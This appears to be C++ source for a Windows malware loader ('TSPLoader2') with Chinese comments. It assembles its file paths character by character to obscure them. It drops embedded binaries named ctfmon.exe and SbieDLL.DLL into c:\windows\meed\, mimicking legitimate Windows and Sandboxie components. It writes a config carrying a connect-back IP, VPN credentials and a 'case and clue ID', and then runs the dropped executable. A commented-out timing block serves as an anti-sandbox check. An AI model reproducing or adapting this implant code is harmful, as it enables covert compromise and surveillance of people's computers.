// TSPLoader2.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include "TSPLoader2.h"
#include "server.h"
#include "sbieDLL.h"
#include "ctfmon.h"

#include <io.h>
#include <stdio.h>

#include <imagehlp.h>
#pragma comment(lib, "imagehlp.lib")


#include "7z\Types.h"
#include "7z\LzmaLib.h"
// #include "zlib.h"
// #pragma comment(lib, "zlib-1.1.4.lib")


#define CASE_CLUE_ID_SIGN  "123456789_abcdefghi"


//#define CASE_CLUE_ID_SIGN  "12345678_87654321"


TCHAR szConnectIp[256]="CHAONIMADEXXX";  //包含下面的VPN结构体


////add by zhenyu with VPNInfo
struct VPNINFO
{
	TCHAR szConnectIp[64];
	TCHAR szVPNServerIp[64];
	//TCHAR szVPNTSPClientIP[64];
	TCHAR szVPNUser[32] ;
	TCHAR szPassd[32] ;
};

typedef struct VPNINFO  stu_vpn_param;

//add end


TCHAR tchStrCaseAndClueID[50] = CASE_CLUE_ID_SIGN;  //案件和线索ID 字符串

BOOL WriteDataToFile(LPCSTR lpFileName, PCHAR lpConfigString,BYTE *pCompressBuf,DWORD nCompressSize)
{
	BOOL bRet=FALSE;

	HANDLE hFile = CreateFileA
		(
		lpFileName, 
		GENERIC_READ|GENERIC_WRITE,
		NULL,//独占
		NULL,
		CREATE_ALWAYS,//存在时覆盖原有文件
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);

	if (lpConfigString != NULL){
		pCompressBuf[0]=0;
		pCompressBuf[1]=0;

	}

	DWORD dwBytes;
	WriteFile(hFile, pCompressBuf, nCompressSize, &dwBytes, NULL);
	// 写入配置
	if (lpConfigString != NULL){
		WriteFile(hFile, lpConfigString, lstrlenA(lpConfigString)+1, &dwBytes, NULL);
	}
	CloseHandle(hFile);

	return TRUE;

}



int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
/////add by ceshi

//	__asm
//	{
//		rdtsc;
//		push edx;
//		push 2000;
//		mov eax, Sleep;
//		call eax;
//		rdtsc;
//		pop eax;
//		cmp eax, edx;
//		jz DEAD;
//	}
//
//	CreateWindow(0,0,0,0,0,0,0,0,0,0,0);
//	goto next;
//
//DEAD: 
//	return 0;
//
//next:

	////add end



	TCHAR tchIPAndID[260] = {0};  //以前是101,现在添加了150

	//add by zhenyu
	stu_vpn_param *stu=(stu_vpn_param*)szConnectIp;

	//sprintf(tchIPAndID,"%s}%s",szConnectIp,tchStrCaseAndClueID);
	sprintf(tchIPAndID,"%s{%s{%s{%s}%s",stu->szConnectIp,stu->szVPNServerIp,stu->szVPNUser,stu->szPassd,tchStrCaseAndClueID);

	//add end


	TCHAR szMeed[MAX_PATH];
	szMeed[0]='c';szMeed[1]=':';szMeed[2]='\\';szMeed[3]='w';szMeed[4]='i';
	szMeed[5]='n';szMeed[6]='d';szMeed[7]='o';szMeed[8]='w';szMeed[9]='s';
	szMeed[10]='\\';szMeed[11]='m';szMeed[12]='e';szMeed[13]='e';szMeed[14]='d';
	szMeed[15]='\\';szMeed[16]=0;

	if (!MakeSureDirectoryPathExists(szMeed)) 
	{
		return 0;
	}

	
	
	TCHAR szCtfmonPath[MAX_PATH];
	strcpy(szCtfmonPath,szMeed);
	int len=16;
	szCtfmonPath[len++]='c';
	szCtfmonPath[len++]='t';
	szCtfmonPath[len++]='f';
	szCtfmonPath[len++]='m';
	szCtfmonPath[len++]='o';
	szCtfmonPath[len++]='n';
	szCtfmonPath[len++]='.';
	szCtfmonPath[len++]='e';
	szCtfmonPath[len++]='x';
	szCtfmonPath[len++]='e';
	szCtfmonPath[len++]=0;


	TCHAR szSbieDllPath[MAX_PATH];
	strcpy(szSbieDllPath,szMeed);
	len=16;

	szSbieDllPath[0+len]='S';szSbieDllPath[1+len]='b';szSbieDllPath[2+len]='i';szSbieDllPath[3+len]='e';szSbieDllPath[4+len]='D';
	szSbieDllPath[5+len]='L';szSbieDllPath[6+len]='L';szSbieDllPath[7+len]='.';szSbieDllPath[8+len]='D';szSbieDllPath[9+len]='L';
 	szSbieDllPath[10+len]='L';szSbieDllPath[11+len]=0;


	TCHAR szSbieDll_bak_Path[MAX_PATH];
	strcpy(szSbieDll_bak_Path,szSbieDllPath);
	strcat(szSbieDll_bak_Path,".bak");	

	HANDLE hEvent=OpenEvent(EVENT_ALL_ACCESS,FALSE,TEXT("nimdkeikd"));
	if (hEvent)
	{
		SetEvent(hEvent);
		CloseHandle(hEvent);
		Sleep(2000);
	}

	if (_access(szCtfmonPath,0)==-1)
	{
		WriteDataToFile(szCtfmonPath,0,szCtfmon,sizeof(szCtfmon));
	}
 
	if (_access(szSbieDllPath,0)==-1)
	{
		WriteDataToFile(szSbieDllPath,0,szSbieDll,sizeof(szSbieDll));

	}

	WriteDataToFile(szSbieDll_bak_Path,tchIPAndID,data,sizeof(data));
		
	char chSelfFullName[MAX_PATH];
	memset(&chSelfFullName,0,sizeof(chSelfFullName));

	GetModuleFileName(NULL,chSelfFullName,sizeof(chSelfFullName));

	sprintf(szCtfmonPath+strlen(szCtfmonPath)," -mi %s",chSelfFullName);


	WinExec(szCtfmonPath,1);


	return 0;
}


